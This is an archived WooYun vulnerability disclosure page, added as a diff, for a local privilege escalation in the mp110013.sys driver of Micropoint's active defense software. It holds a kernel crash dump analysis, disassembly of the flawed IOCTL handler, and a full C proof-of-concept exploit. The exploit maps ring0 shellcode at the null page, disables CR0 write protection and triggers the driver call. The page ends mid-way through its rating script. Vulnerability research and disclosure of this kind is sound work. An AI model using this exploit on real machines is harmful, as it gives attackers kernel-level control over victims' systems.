@@ -1,0 +1,1093 @@
+﻿<!doctype html>
+                        <html lang="en">
+                        <head>
+	                        <meta charset="UTF-8">
+	                        <title>		东方微点主动防御 &lt;= 1.2.10581.0278 Mp110013.sys 本地特权提升漏洞  </title>
+	                        <link href="../css/css.css" rel="stylesheet" /> 
+                        </head>
+                        <body> 
+                        <ul><li>标题：		东方微点主动防御 &lt;= 1.2.10581.0278 Mp110013.sys 本地特权提升漏洞  </li><li>作者：		<a href="http://www.wooyun.org/whitehats/shineast">shineast</a> 
+</li><li>提交时间：		2010-07-19 15:05</li></ul>
+                        <div class="con">
+                        <h2>漏洞详情</h2>
+		<h3 class="detailTitle">披露状态：</h3>
+		<p class="detail" style="padding-bottom:0">
+					</p>
+		<p class="detail">
+									2010-07-19：	积极联系厂商并且等待厂商认领中，细节不对外公开<br/>
+									2010-07-19：	厂商已经主动忽略漏洞，细节向公众公开<br/>
+					</p>
+		<h3 class="detailTitle">简要描述：</h3>
+
+		<p class="detail">该漏洞是我2010年4月7日晚上，通过自己的IoControl Fuzz工具挖掘的。漏洞存在于东方微点mp110013.sys这个驱动中，影响东方微点主动防御软件1.2.10581.0278和以前的版本。利用该漏洞能够实现本地特权提升，进Ring0。<br />
+</p>
+
+				
+						<h3 class="detailTitle">详细说明：</h3>
+		
+			<p class="detail">UNEXPECTED_KERNEL_MODE_TRAP (7f)<br />
+<br />
+This means a trap occurred in kernel mode, and it&#039;s a trap of a kind<br />
+<br />
+that the kernel isn&#039;t allowed to have/catch (bound trap) or that<br />
+<br />
+is always instant death (double fault).  The first number in the<br />
+<br />
+bugcheck params is the number of the trap (8 = double fault, etc)<br />
+<br />
+Consult an Intel x86 family manual to learn more about what these<br />
+<br />
+traps are. Here is a *portion* of those codes:<br />
+<br />
+If kv shows a taskGate<br />
+<br />
+        use .tss on the part before the colon, then kv.<br />
+<br />
+Else if kv shows a trapframe<br />
+<br />
+        use .trap on that value<br />
+<br />
+Else<br />
+<br />
+        .trap on the appropriate frame will show where the trap was taken<br />
+<br />
+        (on x86, this will be the ebp that goes with the procedure KiTrap)<br />
+<br />
+Endif<br />
+<br />
+kb will then show the corrected stack.<br />
+<br />
+Arguments:<br />
+<br />
+Arg1: 00000008, EXCEPTION_DOUBLE_FAULT<br />
+<br />
+Arg2: 80042000<br />
+<br />
+Arg3: 00000000<br />
+<br />
+Arg4: 00000000 <br />
+<br />
+Debugging Details:<br />
+<br />
+------------------   <br />
+<br />
+BUGCHECK_STR:  0x7f_8 <br />
+<br />
+TSS:  00000028 -- (.tss 0x28)<br />
+<br />
+eax=81123880 ebx=81120f80 ecx=2c23f92a edx=8000012c esi=00000000 edi=8113f388<br />
+<br />
+eip=f96a37c0 esp=f7b25000 ebp=f7b278f8 iopl=0         nv up ei ng nz ac po nc<br />
+<br />
+cs=0008  ss=0010  ds=0023  es=0023  fs=0030  gs=0000             efl=00010292<br />
+<br />
+mp110013+0x7c0:<br />
+<br />
+f96a37c0 ff30    push    dword ptr [eax]      ds:0023:81123880=00000937<br />
+<br />
+Resetting default scope<br />
+<br />
+DEFAULT_BUCKET_ID:  CODE_CORRUPTION<br />
+<br />
+PROCESS_NAME:  MPSVC2.exe<br />
+<br />
+LAST_CONTROL_TRANSFER:  from f96a8c06 to f96a37c0<br />
+<br />
+STACK_TEXT:  <br />
+<br />
+WARNING: Stack unwind information not available. Following frames may be wrong.<br />
+<br />
+f7b278f8 f96a8c06 81120f80 80e5ea38 817cf210 mp110013+0x7c0<br />
+<br />
+f7b27ac8 804ef003 81728030 8113f388 806d12d0 mp110013+0x5c06<br />
+<br />
+f7b27ad8 80574e4e 8113f3f8 811ec470 8113f388 nt!IopfCallDriver+0x31<br />
+<br />
+f7b27aec 80575cdd 81728030 8113f388 811ec470 nt!IopSynchronousServiceTail+0x60<br />
+<br />
+f7b27b94 8056e63a 00000508 00000000 00000000 nt!IopXxxControlFile+0x5e7<br />
+<br />
+f7b27bc8 f7363b12 00000508 00000000 00000000 nt!NtDeviceIoControlFile+0x2a<br />
+<br />
+f7b27c44 f99b081f 00000508 00000000 00000000 BehaviorMon!HookNtDeviceIoControlFile+0x892 <br />
+<br />
+f7b27d34 8053da48 00000508 00000000 00000000 Hookport+0x481f<br />
+<br />
+f7b27d34 7c92eb94 00000508 00000000 00000000 nt!KiFastCallEntry+0xf8<br />
+<br />
+0358f70c 7c92d8ef 7c801671 00000508 00000000 ntdll!KiFastSystemCallRet<br />
+<br />
+0358f710 7c801671 00000508 00000000 00000000 ntdll!ZwDeviceIoControlFile+0xc<br />
+<br />
+0358f770 006281bd 00000508 8000012c 0358f7c4 kernel32!DeviceIoControl+0xdd<br />
+<br />
+0358fed8 003c7b9d 0000022c 0358fefc 0358ff04 mp110034+0x81bd<br />
+<br />
+00000000 00000000 00000000 00000000 00000000 mp110036+0x7b9d<br />
+<br />
+	从过分析中的栈回溯，可以看到最终出问题的代码落在mp110013+0x5c06和mp110013+0x7c0所处的函数中。导致崩溃的指令如下：<br />
+<br />
+f96a37c0 ff30    push    dword ptr [eax]      ds:0023:81123880=00000937<br />
+<br />
+	这条指令的寻址都是正常的，eax指向的DWORD是存在，那为什么无法push呢？！除非此时发生了“栈上溢”。这时我们来看看发生崩溃时的esp值，从上面的分析可以看到当时esp值为f7b25000，我们再查这个地址的属性。<br />
+<br />
+	kd&gt; !address f7b25000<br />
+<br />
+	  f7b24000 - 00004000                           <br />
+<br />
+	          Usage       KernelSpaceUsageKernelStack<br />
+<br />
+	          KernelStack 80e5e828 : 3d4.82c<br />
+<br />
+	可以看出，该地址处于内核栈的顶部，由于系统在栈顶预留了0x1000的空间，因此已经无法再push了。<br />
+<br />
+	kd&gt; dd f7b25000-4<br />
+<br />
+	f7b24ffc  ???????? 00000000 00000000 8113bf1c<br />
+<br />
+	f7b2500c  81123ab0 43504354 020a0027 00000000<br />
+<br />
+	f7b2501c  00000000 00000000 00000000 00000000<br />
+<br />
+	看到了内核崩溃的直接原因后，下面我们需要找到其根本原因。首先我们定位到mp110013+0x5c06所在的函数，如下所示：<br />
+<br />
+	.text:00015BE4 loc_15BE4:            ; CODE XREF: .text:00015BD7j<br />
+<br />
+	.text:00015BE4                 push    dword ptr [ebp-74h]<br />
+<br />
+	.text:00015BE7                 push    dword ptr [ebp-98h]<br />
+<br />
+	.text:00015BED                 lea     eax, [ebp-0E8h]<br />
+<br />
+	.text:00015BF3                 push    eax<br />
+<br />
+	.text:00015BF4                 push    ebx<br />
+<br />
+	.text:00015BF5                 call    sub_1090E<br />
+<br />
+	.text:00015BFA                 mov     [ebp-94h], eax<br />
+<br />
+	.text:00015C00                 push    ebx			// 输入缓冲区指针<br />
+<br />
+	.text:00015C01                 call    sub_107B0		// 函数调用<br />
+<br />
+	.text:00015C06                 mov     [edi+1Ch], eax<br />
+<br />
+	.text:00015C09                 cmp     [ebp-94h], esi<br />
+<br />
+	.text:00015C0F                 jz      short loc_15C1E<br />
+<br />
+	.text:00015C11                 lea     eax, [ebp-0E8h]<br />
+<br />
+	.text:00015C17                 push    eax<br />
+<br />
+	.text:00015C18                 push    ebx<br />
+<br />
+	.text:00015C19                 call    sub_107FE<br />
+<br />
+	可以看到，该函数会调用到sub_107B0函数，那么我们再来看看sub_107B0函数的逻辑：<br />
+<br />
+	.text:000107B0 sub_107B0       proc near     ; CODE XREF: .text:00015C01p<br />
+<br />
+	.text:000107B0<br />
+<br />
+	.text:000107B0 arg_0           = dword ptr  8    // 输入缓冲区指针<br />
+<br />
+	.text:000107B0<br />
+<br />
+	.text:000107B0                 mov     edi, edi<br />
+<br />
+	.text:000107B2                 push    ebp<br />
+<br />
+	.text:000107B3                 mov     ebp, esp<br />
+<br />
+	.text:000107B5                 mov     eax, [ebp+arg_0]		<br />
+<br />
+	.text:000107B8                 add     eax, 4<br />
+<br />
+	.text:000107BB                 mov     ecx, [eax]		// 循环次数 可控<br />
+<br />
+	// 是输入缓冲区第二个DWORD<br />
+<br />
+	.text:000107BD                 add     eax, 4 <br />
+<br />
+	.text:000107C0 loc_107C0:              ; CODE XREF: sub_107B0+15j<br />
+<br />
+	.text:000107C0                 push    dword ptr [eax]		// 栈上溢<br />
+<br />
+	.text:000107C2                 add     eax, 4<br />
+<br />
+	.text:000107C5                 loop    loc_107C0<br />
+<br />
+	.text:000107C7                 mov     eax, [ebp+arg_0]<br />
+<br />
+	.text:000107CA                 call    dword ptr [eax]		// 调用输入缓冲区 <br />
+<br />
+	// 第一个DWORD指向的函数<br />
+<br />
+	.text:000107CC                 pop     ebp<br />
+<br />
+	.text:000107CD                 retn    4<br />
+<br />
+	从上面的代码可以看出，sub_107B0函数整个逻辑都是可以控制的，首先该函数中从输入缓冲区的第二个DWORD中取出要循环的次数，然后做了一个循环，最终调用了输入缓冲区的第一个DWORD所指向的函数。<br />
+<br />
+	如果循环的次数太多，会导致栈上溢，但是这个次数我们可以通过输入缓冲区的第二个DWORD来控制，因此我们可以避免栈上溢。我们最为感兴趣的应该是循环后面的一个call指令，调用的是输入缓冲区的第一个DWORD所指向的函数。<br />
+<br />
+	通过几次调试可以发现，只要往输入缓冲区的第一个DWORD处放一个错误的值，在派遣例程中会把他修改成0，这样一来，最终调用的就是0这个地址。这是相当危险的，我们只要在0地址处申请内存，并存放Ring0 Shellcode就可以完美的利用这个漏洞。这一点我们可以通过栈回溯来证明，先看看调用sub_107B0函数的参数：<br />
+<br />
+	f7b278f8 f96a8c06 81120f80 80e5ea38 817cf210 mp110013+0x7c0<br />
+<br />
+	参数是81120f80，我们再来看看这个地址指向的数据，是不是我们输入缓冲区的数据：<br />
+<br />
+	kd&gt; dd 81120f80<br />
+<br />
+	81120f80  00000000 2c240368 5e9e3918 8e3b184c<br />
+<br />
+	81120f90  22d5df8e 961331c8 d5a92216 0aa0f10a<br />
+<br />
+	81120fa0  b7e0c5f7 e75bcb05 97beb301 6c48e205<br />
+<br />
+	81120fb0  43c9daa0 08b79115 6cead1f5 3fe586fd<br />
+<br />
+	81120fc0  00000000 00000000 00000000 00000000<br />
+<br />
+	81120fd0  00000000 00000000 00000000 00000000<br />
+<br />
+	81120fe0  00000000 00000000 00000000 00000000<br />
+<br />
+	81120ff0  00000000 00000000 00000000 00000000<br />
+<br />
+仔细一看，确实和我们之前篡改的输入数据基本一致，不过第一个DWORD被微点的派遣例程修改成了0。这正好如我们所愿，真是太爽了！如果不改成0，也许我们很难利用，而改成0，那就好用多了。总的来说，这是一个本地权限提升内核漏洞。 </p>
+				
+									<h3 class="detailTitle">漏洞证明：</h3>
+
+			<p class="detail">#include &quot;poc.h&quot;<br />
+<br />
+#include &quot;InvbShellCode.h&quot;<br />
+<br />
+<br />
+<br />
+#define BUFFER_LENGTH 128<br />
+<br />
+#define IOCTL_MICROPOINT 0x8000012C<br />
+<br />
+<br />
+<br />
+<br />
+<br />
+void InbvShellCode()<br />
+<br />
+{<br />
+<br />
+	__asm<br />
+<br />
+	{<br />
+<br />
+		nop<br />
+<br />
+			nop<br />
+<br />
+			nop<br />
+<br />
+			nop<br />
+<br />
+			nop<br />
+<br />
+			nop<br />
+<br />
+			nop<br />
+<br />
+			nop<br />
+<br />
+		cli<br />
+<br />
+			mov eax, cr0 <br />
+<br />
+			//mov g_uCr0,eax <br />
+<br />
+			and eax,0xFFFEFFFF <br />
+<br />
+			mov cr0, eax <br />
+<br />
+			_emit 0x5d		//pop ebp<br />
+<br />
+			retn 0x2800		//esp = esp + 0xA00 * 4<br />
+<br />
+	}<br />
+<br />
+}  <br />
+<br />
+<br />
+<br />
+PVOID RtlAllocateMemory(<br />
+<br />
+						IN ULONG Length)<br />
+<br />
+{<br />
+<br />
+    NTSTATUS NtStatus;<br />
+<br />
+	<br />
+<br />
+    PVOID BaseAddress = NULL;<br />
+<br />
+	<br />
+<br />
+	<br />
+<br />
+    NtStatus = NtAllocateVirtualMemory(<br />
+<br />
+		NtCurrentProcess(),<br />
+<br />
+		&amp;BaseAddress,<br />
+<br />
+		0,<br />
+<br />
+		&amp;Length,<br />
+<br />
+		MEM_RESERVE |<br />
+<br />
+		MEM_COMMIT,<br />
+<br />
+		PAGE_READWRITE);<br />
+<br />
+	<br />
+<br />
+    if(NtStatus == STATUS_SUCCESS)<br />
+<br />
+    {<br />
+<br />
+        RtlZeroMemory(BaseAddress, Length);<br />
+<br />
+		<br />
+<br />
+        return BaseAddress;<br />
+<br />
+    }<br />
+<br />
+	<br />
+<br />
+    return NULL;<br />
+<br />
+}<br />
+<br />
+<br />
+<br />
+VOID RtlFreeMemory(<br />
+<br />
+				   IN PVOID BaseAddress)<br />
+<br />
+{<br />
+<br />
+    NTSTATUS NtStatus;<br />
+<br />
+	<br />
+<br />
+    ULONG FreeSize = 0;<br />
+<br />
+	<br />
+<br />
+	<br />
+<br />
+    NtStatus = NtFreeVirtualMemory(<br />
+<br />
+		NtCurrentProcess(),<br />
+<br />
+		&amp;BaseAddress,<br />
+<br />
+		&amp;FreeSize,<br />
+<br />
+		MEM_RELEASE);<br />
+<br />
+}<br />
+<br />
+<br />
+<br />
+int __cdecl main(int argc, char **argv)<br />
+<br />
+{<br />
+<br />
+    NTSTATUS NtStatus;<br />
+<br />
+	<br />
+<br />
+	ULONG i;<br />
+<br />
+    HANDLE DeviceHandle;<br />
+<br />
+    ULONG ReturnLength = 0;<br />
+<br />
+    <br />
+<br />
+    ULONG ImageBase;<br />
+<br />
+    PVOID MappedBase;<br />
+<br />
+    UCHAR ImageName[KERNEL_NAME_LENGTH];<br />
+<br />
+    ULONG DllCharacteristics = DONT_RESOLVE_DLL_REFERENCES;<br />
+<br />
+    PVOID HalDispatchTable;<br />
+<br />
+    PVOID xHalQuerySystemInformation;<br />
+<br />
+    PVOID MmUserProbeAddress;<br />
+<br />
+	<br />
+<br />
+    ULONG ShellCodeSize = PAGE_SIZE;<br />
+<br />
+    PVOID ShellCodeAddress;<br />
+<br />
+    PVOID BaseAddress = NULL;<br />
+<br />
+	<br />
+<br />
+    UNICODE_STRING DeviceName;<br />
+<br />
+    UNICODE_STRING DllName;<br />
+<br />
+    ANSI_STRING ProcedureName;<br />
+<br />
+    OBJECT_ATTRIBUTES ObjectAttributes;<br />
+<br />
+    IO_STATUS_BLOCK IoStatusBlock;<br />
+<br />
+    SYSTEM_MODULE_INFORMATION_EX *ModuleInformation = NULL;<br />
+<br />
+    LARGE_INTEGER Interval; <br />
+<br />
+<br />
+<br />
+	char buffer1[1024]={0};<br />
+<br />
+	char buffer2[1024]={0};<br />
+<br />
+	<br />
+<br />
+	ULONG InternalBuffer = 0;<br />
+<br />
+    char SystemBuffer[BUFFER_LENGTH]= <br />
+<br />
+	/* <br />
+<br />
+	77 00 04 00    03 00 00 00    20 C5 88 03     3F 00 0F 00 <br />
+<br />
+	C8 FA 88 03 00 00 00 00 00 00 00 00 00 00 00 00 <br />
+<br />
+	00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 <br />
+<br />
+	00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 <br />
+<br />
+	*/<br />
+<br />
+	{<br />
+<br />
+		//						A46<br />
+<br />
+		0x7B,0x67,0xB4,0x33,  0x00,0x0A,0x00,0x00,   0x8B,0x68,0xDD,0x6F,0x01,0x52,0x5A,0xB5,<br />
+<br />
+			0x28,0x14,0x44,0x89,0x78,0x32,0xEA,0x5F,0x8E,0x75,0x6B,0x22,0x38,0xB1,0xFD,0x46,<br />
+<br />
+			0x23,0xDB,0xAC,0xFB,0x1D,0x45,0x8F,0x04,0x73,0xD9,0x24,0x1F,0x8A,0x70,0xA6,0xD7,<br />
+<br />
+			0x62,0x7B,0xC2,0x36,0xE7,0xBB,0x3A,0x9D,0x11,0xA8,0xF5,0x84,0x8C,0xCA,0xE3,0xFE,<br />
+<br />
+			0x49,0x79,0x26,0x0D,0x61,0x9A,0x8D,0x17,0xBE,0x6E,0x61,0x57,0x78,0x9C,0xA4,0xC2,<br />
+<br />
+			0x36,0x22,0x8C,0x56,0x39,0xB8,0x26,0x54,0xF1,0xA0,0x1E,0x78,0x5F,0xD3,0xDF,0x98,<br />
+<br />
+			0x35,0x66,0x83,0x55,0xDE,0x14,0x59,0xE2,0x94,0xC4,0xDE,0x31,0xFC,0xF8,0x2F,0x2C,<br />
+<br />
+			0x12,0x04,0xD4,0x0A,0xEE,0x0F,0x95,0xE2,0xDC,0xA1,0x3F,0xB8,0x13,0x55,0x83,0xD3<br />
+<br />
+	};<br />
+<br />
+//正常输入<br />
+<br />
+// 	{<br />
+<br />
+// 		0x77, 0x00 , 0x04 , 0x00 ,     0x03 , 0x00 , 0x00 , 0x00 ,    0x20 , 0xC5 , 0x88 , 0x03 ,   0x3F , 0x00 , 0x0F , 0x00, <br />
+<br />
+// 		0xC8, 0xFA , 0x88 , 0x03<br />
+<br />
+// 	};<br />
+<br />
+<br />
+<br />
+	//*(ULONG *)((ULONG)SystemBuffer+8)=(ULONG)buffer1;<br />
+<br />
+	//*(ULONG *)((ULONG)SystemBuffer+16)=(ULONG)buffer2;<br />
+<br />
+    <br />
+<br />
+    ///////////////////////////////////////////////////////////////////////////////////////////////<br />
+<br />
+	<br />
+<br />
+    system(&quot;cls&quot;);<br />
+<br />
+	<br />
+<br />
+    NtStatus = NtQuerySystemInformation(<br />
+<br />
+		SystemModuleInformation,<br />
+<br />
+		ModuleInformation,<br />
+<br />
+		ReturnLength,<br />
+<br />
+		&amp;ReturnLength);<br />
+<br />
+	<br />
+<br />
+    if(NtStatus == STATUS_INFO_LENGTH_MISMATCH)<br />
+<br />
+    {<br />
+<br />
+        ReturnLength = (ReturnLength &amp; 0xFFFFF000) + PAGE_SIZE * sizeof(ULONG);<br />
+<br />
+        <br />
+<br />
+        ModuleInformation = RtlAllocateMemory(ReturnLength);<br />
+<br />
+		<br />
+<br />
+        if(ModuleInformation)<br />
+<br />
+        {<br />
+<br />
+            NtStatus = NtQuerySystemInformation(<br />
+<br />
+				SystemModuleInformation,<br />
+<br />
+				ModuleInformation,<br />
+<br />
+				ReturnLength,<br />
+<br />
+				NULL);<br />
+<br />
+			<br />
+<br />
+            if(NtStatus == STATUS_SUCCESS)<br />
+<br />
+            {<br />
+<br />
+                ImageBase = (ULONG)(ModuleInformation-&gt;Modules[0].Base);<br />
+<br />
+				<br />
+<br />
+                RtlMoveMemory(<br />
+<br />
+					ImageName,<br />
+<br />
+					(PVOID)(ModuleInformation-&gt;Modules[0].ImageName +<br />
+<br />
+					ModuleInformation-&gt;Modules[0].ModuleNameOffset),<br />
+<br />
+					KERNEL_NAME_LENGTH);<br />
+<br />
+				<br />
+<br />
+                printf(&quot; +----------------------------------------------------------------------------+\n&quot;<br />
+<br />
+					&quot; | ImageBase - 0x%.8X                                                     |\n&quot;<br />
+<br />
+					&quot; | ImageName - %s                                                   |\n&quot;,<br />
+<br />
+					ImageBase,<br />
+<br />
+					ImageName);<br />
+<br />
+				<br />
+<br />
+				<br />
+<br />
+                RtlFreeMemory(ModuleInformation);<br />
+<br />
+				<br />
+<br />
+				<br />
+<br />
+                RtlCreateUnicodeStringFromAsciiz(&amp;DllName, (PUCHAR)ImageName);<br />
+<br />
+				<br />
+<br />
+				<br />
+<br />
+                NtStatus = LdrLoadDll(<br />
+<br />
+					NULL,                // DllPath<br />
+<br />
+					&amp;DllCharacteristics, // DllCharacteristics<br />
+<br />
+					&amp;DllName,            // DllName<br />
+<br />
+					&amp;MappedBase);        // DllHandle<br />
+<br />
+				<br />
+<br />
+                if(NtStatus)<br />
+<br />
+                {<br />
+<br />
+                    printf(&quot; [*] NtStatus of LdrLoadDll - %.8X\n&quot;, NtStatus);    <br />
+<br />
+                    return NtStatus;<br />
+<br />
+                }<br />
+<br />
+				<br />
+<br />
+				<br />
+<br />
+                RtlInitAnsiString(&amp;ProcedureName, &quot;HalDispatchTable&quot;);<br />
+<br />
+				<br />
+<br />
+				<br />
+<br />
+                NtStatus = LdrGetProcedureAddress(<br />
+<br />
+					(PVOID)MappedBase,          // DllHandle<br />
+<br />
+					&amp;ProcedureName,             // ProcedureName<br />
+<br />
+					0,                          // ProcedureNumber OPTIONAL<br />
+<br />
+					(PVOID*)&amp;HalDispatchTable); // ProcedureAddress<br />
+<br />
+				<br />
+<br />
+                if(NtStatus)<br />
+<br />
+                {<br />
+<br />
+                    printf(&quot; [*] NtStatus of LdrGetProcedureAddress - %.8X\n&quot;, NtStatus);    <br />
+<br />
+                    return NtStatus;<br />
+<br />
+                }<br />
+<br />
+				<br />
+<br />
+                (ULONG)HalDispatchTable -= (ULONG)MappedBase;<br />
+<br />
+                (ULONG)HalDispatchTable += ImageBase;<br />
+<br />
+				<br />
+<br />
+                (ULONG)xHalQuerySystemInformation = (ULONG)HalDispatchTable + sizeof(ULONG);<br />
+<br />
+				<br />
+<br />
+                printf(&quot; |                                                                            |\n&quot;<br />
+<br />
+					&quot; | HalDispatchTable - 0x%.8X                                              |\n&quot;<br />
+<br />
+					&quot; | xHalQuerySystemInformation - 0x%.8X                                    |\n&quot;<br />
+<br />
+					&quot; +----------------------------------------------------------------------------+\n&quot;,<br />
+<br />
+					HalDispatchTable,<br />
+<br />
+					xHalQuerySystemInformation);<br />
+<br />
+				<br />
+<br />
+				<br />
+<br />
+                NtStatus = XxInitInbv(ImageBase, (ULONG)MappedBase);<br />
+<br />
+				<br />
+<br />
+                if(NtStatus)<br />
+<br />
+                {<br />
+<br />
+                    printf(&quot; [*] NtStatus of XxInitInbv - %.8X\n&quot;, NtStatus);	<br />
+<br />
+                    return NtStatus;<br />
+<br />
+                }<br />
+<br />
+				<br />
+<br />
+                LdrUnloadDll((PVOID)MappedBase);<br />
+<br />
+				<br />
+<br />
+				<br />
+<br />
+                RtlInitUnicodeString(&amp;DeviceName, L&quot;\\Device\\mp110013&quot;);<br />
+<br />
+				<br />
+<br />
+                ObjectAttributes.Length = sizeof(OBJECT_ATTRIBUTES);<br />
+<br />
+                ObjectAttributes.RootDirectory = 0;<br />
+<br />
+                ObjectAttributes.ObjectName = &amp;DeviceName;<br />
+<br />
+                ObjectAttributes.Attributes = OBJ_CASE_INSENSITIVE;<br />
+<br />
+                ObjectAttributes.SecurityDescriptor = NULL;<br />
+<br />
+                ObjectAttributes.SecurityQualityOfService = NULL;<br />
+<br />
+				<br />
+<br />
+                NtStatus = NtCreateFile(<br />
+<br />
+					&amp;DeviceHandle,     // FileHandle<br />
+<br />
+					FILE_READ_DATA |<br />
+<br />
+					FILE_WRITE_DATA,   // DesiredAccess<br />
+<br />
+					&amp;ObjectAttributes, // ObjectAttributes<br />
+<br />
+					&amp;IoStatusBlock,    // IoStatusBlock<br />
+<br />
+					NULL,              // AllocationSize OPTIONAL<br />
+<br />
+					0,                 // FileAttributes<br />
+<br />
+					FILE_SHARE_READ |<br />
+<br />
+					FILE_SHARE_WRITE, // ShareAccess<br />
+<br />
+					FILE_OPEN_IF,     // CreateDisposition<br />
+<br />
+					0,                // CreateOptions<br />
+<br />
+					NULL,             // EaBuffer OPTIONAL<br />
+<br />
+					0);               // EaLength<br />
+<br />
+				<br />
+<br />
+                if(NtStatus)<br />
+<br />
+                {<br />
+<br />
+                    printf(&quot; [*] NtStatus of NtCreateFile - %.8X\n&quot;, NtStatus);    <br />
+<br />
+                    return NtStatus;<br />
+<br />
+                }<br />
+<br />
+<br />
+<br />
+				printf(&quot; [*] NtCreateFile - DeviceHandle = %.8X\n&quot;, DeviceHandle); <br />
+<br />
+				<br />
+<br />
+				///////////////////////////////////////////////////////////////////////////////////////////////<br />
+<br />
+				<br />
+<br />
+				///////////////////////////////////////////////////////////////////////////////////////////////<br />
+<br />
+				<br />
+<br />
+                ShellCodeAddress = (PVOID)sizeof(ULONG);<br />
+<br />
+				<br />
+<br />
+                NtStatus = NtAllocateVirtualMemory(<br />
+<br />
+					NtCurrentProcess(),      // ProcessHandle<br />
+<br />
+					&amp;ShellCodeAddress,       // BaseAddress<br />
+<br />
+					0,                       // ZeroBits<br />
+<br />
+					&amp;ShellCodeSize,          // AllocationSize<br />
+<br />
+					MEM_RESERVE | <br />
+<br />
+					MEM_COMMIT |<br />
+<br />
+					MEM_TOP_DOWN,            // AllocationType<br />
+<br />
+					PAGE_EXECUTE_READWRITE); // Protect<br />
+<br />
+				<br />
+<br />
+                if(NtStatus)<br />
+<br />
+                {<br />
+<br />
+                    printf(&quot; [*] NtStatus of NtAllocateVirtualMemory - %.8X\n&quot;, NtStatus);    <br />
+<br />
+                    return NtStatus;<br />
+<br />
+                }<br />
+<br />
+				<br />
+<br />
+				printf(&quot;NtAllocateVirtualMemory ShellCodeAddress = %08X ShellCodeSize=%08X\n&quot;, ShellCodeAddress,ShellCodeSize); <br />
+<br />
+				<br />
+<br />
+                RtlMoveMemory(<br />
+<br />
+					ShellCodeAddress,<br />
+<br />
+					(PVOID)InbvShellCode,<br />
+<br />
+                    ShellCodeSize);<br />
+<br />
+				///////////////////////////////////////////////////////////////////////////////////////////////<br />
+<br />
+							<br />
+<br />
+				<br />
+<br />
+				NtStatus = NtDeviceIoControlFile(<br />
+<br />
+					DeviceHandle,<br />
+<br />
+					NULL,<br />
+<br />
+					NULL,<br />
+<br />
+					NULL,<br />
+<br />
+					&amp;IoStatusBlock,<br />
+<br />
+					IOCTL_MICROPOINT,<br />
+<br />
+					SystemBuffer,<br />
+<br />
+					BUFFER_LENGTH,<br />
+<br />
+					NULL,<br />
+<br />
+					0);<br />
+<br />
+ <br />
+<br />
+				<br />
+<br />
+				if(NtStatus)<br />
+<br />
+				{<br />
+<br />
+					printf(&quot; [*] NtStatus of NtDeviceIoControlFile [3] - 0x%.8X\n&quot;, NtStatus);<br />
+<br />
+					return NtStatus;<br />
+<br />
+				}<br />
+<br />
+				<br />
+<br />
+<br />
+<br />
+<br />
+<br />
+                Interval.LowPart = 0xFF676980;<br />
+<br />
+                Interval.HighPart = 0xFFFFFFFF;<br />
+<br />
+<br />
+<br />
+                printf(&quot;\n 3&quot;);<br />
+<br />
+                NtDelayExecution(FALSE, &amp;Interval);<br />
+<br />
+<br />
+<br />
+                printf(&quot; 2&quot;);<br />
+<br />
+                NtDelayExecution(FALSE, &amp;Interval);<br />
+<br />
+<br />
+<br />
+                printf(&quot; 1&quot;);<br />
+<br />
+                NtDelayExecution(FALSE, &amp;Interval);<br />
+<br />
+<br />
+<br />
+                printf(&quot; Hoop\n\n&quot;);<br />
+<br />
+                NtDelayExecution(FALSE, &amp;Interval);<br />
+<br />
+<br />
+<br />
+<br />
+<br />
+                NtStatus = NtQueryIntervalProfile(<br />
+<br />
+                                                  ProfileTotalIssues, // Source<br />
+<br />
+                                                  NULL);              // Interval<br />
+<br />
+<br />
+<br />
+                if(NtStatus)<br />
+<br />
+                {<br />
+<br />
+                    printf(&quot; [*] NtStatus of NtQueryIntervalProfile - %.8X\n&quot;, NtStatus);<br />
+<br />
+                    return NtStatus;<br />
+<br />
+                }<br />
+<br />
+<br />
+<br />
+				printf(&quot;NtQueryIntervalProfile ok!\n&quot;);<br />
+<br />
+                <br />
+<br />
+<br />
+<br />
+                NtStatus = NtClose(DeviceHandle);<br />
+<br />
+<br />
+<br />
+                if(NtStatus)<br />
+<br />
+                {<br />
+<br />
+                    printf(&quot; [*] NtStatus of NtClose - %.8X\n&quot;, NtStatus);    <br />
+<br />
+                    return NtStatus;<br />
+<br />
+                }<br />
+<br />
+<br />
+<br />
+				printf(&quot;NtClose ok!\n&quot;);<br />
+<br />
+            }<br />
+<br />
+        }<br />
+<br />
+    }<br />
+<br />
+    <br />
+<br />
+    return FALSE;<br />
+<br />
+} </p>
+
+									<h3 class="detailTitle">修复方案：</h3>
+			<p class="detail">该漏洞微点已经告知我修复完毕！ </p>
+										<h3 class="detailTitle">版权声明：转载请注明来源 <a style="font-weight:normal" href="http://www.wooyun.org/whitehats/shineast" title="shineast">shineast</a>@<a style="font-weight:normal" href="http://www.wooyun.org/bugs/wooyun-2010-045" title="东方微点主动防御 &lt;= 1.2.10581.0278 Mp110013.sys 本地特权提升漏洞">乌云</a></h3>
+		<hr align="center"/>
+
+				
+			<h2>漏洞回应</h2>
+			
+			
+									<h3 class="detailTitle">厂商回应：</h3>
+										<p class="detail">未能联系到厂商或者厂商积极拒绝</p>
+																<p class="detail">漏洞Rank：9 (WooYun评价)</p>
+												
+					
+		
+<hr align="center" />
+<script type="text/javascript">
+var bugid="45";
+var bugRating="-3";
+var myRating="";
+var ratingCount="0";
+
+
+
+function ShowBugRating(k){
+	var ratingItems=$(".myrating span");
+	$.each(ratingItems,function(i,n){
+		var nk=parseInt($(n).attr("rel"));
+		if(nk<=k){
+			$(n).addClass("on");
+		}else{
+			$(n).removeClass("on");
+		}
+	});
+	$(".myrating span").hover(
+		function(){
+			$("#ratingShow").html($(this).attr("data-title"));
+		},
+		function(){
+			$("#ratingShow").html("");
+		}
+	);
+}
+$(document).ready(function(){
+	if(myRating==""){
+		var ratingItems=$(".myrating span");
+		$(".myrating span").hover(
+			function(){
+				$(this).addClass("hover");
+				var k=parseInt($(this).attr("rel"));
+				$.each(ratingItems,function(i,n){
+					var nk=parseInt($(n).attr("rel"));
+					if(nk<k) $(n).addClass("on");
+					if(nk>k) $(n).removeClass("on");
+				});
+				$("#ratingShow").html($(this).attr("data-title"));
+			},
+			function(){
+				$(this).removeClass("hover");
+				if($("#myRating").val()==""){
+					$.each(ratingItems,function(i,n){
+						$(n).removeClass("on");
+					});
+				}
+				$("#ratingShow").html("");
+			}
+		);
+
+		$(".myrating span").click(function(){
+			var rating=$(this).attr("rel");
+			var k=parseInt($(this).attr("rel"));
+			$.post("/ajaxdo.php?module=bugrating",{"id":bugid,"rating":rating,"token":$("#token").val()},function(re){
+				//消除操作绑定
+				$(".myrating span").unbind();
+				re=parseInt(re);
+				switch(re){
+					case 1:
